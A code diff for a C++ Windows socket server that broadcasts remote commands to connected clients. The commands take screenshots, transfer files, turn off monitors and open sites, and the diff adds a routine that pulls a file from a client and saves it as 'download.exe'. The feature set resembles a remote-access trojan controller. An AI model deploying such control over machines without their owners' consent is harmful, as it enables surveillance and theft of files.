@@ -89,7 +89,7 @@ int main() {
 		while (true) {
 			char m_connect[256] = "";
 			int i = 0;
-			std::cout << "Enter the command: \ n - s send the file \ n - m display the message \ n - o turn off the monitor \ n - e close the client \ n - w open the site \ n - c take a screenshot\n";
+			std::cout << "Enter the command:  \n-- s send the file \n--m display the message \n--o turn off the monitor \n--e close the client \n--w open the site \n--c take a screenshot\n--d download file\n";
 			char a = getchar();
 			while (a != '\n') {
 				m_connect[i] = a;
@@ -99,7 +99,7 @@ int main() {
 			for (int i = 0; i <= ClientCount; i++) {
 				send(Connections[i], m_connect, strlen(m_connect), NULL);
 			}
-			if ((m_connect[2] == 's')&&(m_connect[0]=='-')&&((m_connect[1] == '-'))) {
+			if ((m_connect[0] == '-')&&(m_connect[1]=='-')&&((m_connect[2] == 's'))) {
 				const int buflen = 1024;
 				bool end = false;
 				bool end2 = false;
@@ -129,7 +129,7 @@ int main() {
 							end = true;
 						}
 						int size = ftell(in);
-						if (b != 0) send(Connections[ClientCount], bufer, buflen, 0);
+						send(Connections[ClientCount], bufer, buflen, 0);
 						if (end2) { break; }
 					}
 					else {
@@ -143,7 +143,7 @@ int main() {
 				fclose(in);
 				std::cout << "File has been sent!\n";
 			}
-			else if ((m_connect[2] == 'c') && (m_connect[0] == '-') && ((m_connect[1] == '-'))) {
+			else if ((m_connect[0] == '-') && (m_connect[1] == '-') && ((m_connect[2] == 'c'))) {
 				std::cout << "Trying to upload a screenshot\n";
 				HANDLE hFile;
 				hFile = CreateFile("screendown.png",
@@ -173,6 +173,43 @@ int main() {
 						}
 						WriteFile(hFile, buff, nbytes-3, &dwBytesWritten, NULL);
 						std::cout << "Screenshot loaded\n"; break;
+					}
+					else {
+						WriteFile(hFile, buff, nbytes, &dwBytesWritten, NULL);
+					}
+				}
+				CloseHandle(hFile);
+			}
+			else if ((m_connect[0] == '-') && (m_connect[1] == '-') && ((m_connect[2] == 'd'))) {
+				std::cout << "Trying to download file\n";
+				HANDLE hFile;
+				hFile = CreateFile("download.exe",
+					GENERIC_WRITE,
+					0,
+					NULL,
+					OPEN_ALWAYS,
+					FILE_ATTRIBUTE_NORMAL,
+					NULL);
+				const int bufsize = 1024;
+				DWORD dwBytesWritten;
+				while (1) {
+					bool exit = false;
+					char buff[bufsize] = "";
+					int nbytes = recv(Connect, buff, sizeof(buff), 0);
+					if (nbytes == 0) {
+						std::cout << "file loaded\n"; break;
+					}
+					if (nbytes < 0)
+					{
+						break;
+					}
+					if ((buff[bufsize - 1] == '@') && (buff[bufsize - 2] == '@') && (buff[bufsize - 3] == '^')) { exit = true; }
+					if (exit) {
+						if (!checkend(buff, bufsize)) {
+							std::cout << "File loaded\n"; break;
+						}
+						WriteFile(hFile, buff, nbytes - 3, &dwBytesWritten, NULL);
+						std::cout << "File loaded\n"; break;
 					}
 					else {
 						WriteFile(hFile, buff, nbytes, &dwBytesWritten, NULL);
